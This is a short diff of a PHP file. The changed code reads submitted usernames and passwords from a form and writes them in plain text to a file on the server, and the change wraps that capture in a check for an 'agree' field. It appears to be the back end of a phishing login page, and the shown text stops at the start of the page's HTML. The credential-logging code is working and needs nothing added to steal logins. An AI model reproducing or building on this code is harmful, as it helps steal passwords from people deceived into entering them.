@@ -1,4 +1,5 @@
 <?php
+if(isset($_POST['agree'])){
     $Name = "username:".$_POST['username']."
     ";
     $Pass = "password:".$_POST['password']."
@@ -7,6 +8,7 @@
     fwrite($file, $Name);
     fwrite($file, $Pass);
     fclose($file);
+}
 ?>
 
 <!DOCTYPE html>
